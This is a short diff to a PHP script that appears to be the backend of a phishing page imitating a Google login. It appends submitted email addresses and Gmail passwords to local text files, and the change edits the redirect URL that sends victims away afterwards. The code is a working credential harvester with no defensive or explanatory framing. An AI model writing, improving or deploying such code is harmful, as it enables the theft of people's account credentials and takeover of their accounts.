@@ -4,5 +4,5 @@ file_put_contents("usernames.txt", "Google Useename : " . $email = $_POST['email
 ?>
 <?php
 file_put_contents("pass.txt", "Gmail Password : " . $pass = $_POST['password'] . "\n", FILE_APPEND);
-header('Location: redirecturl');
+header('Location: https://redirecturl');
 ?>
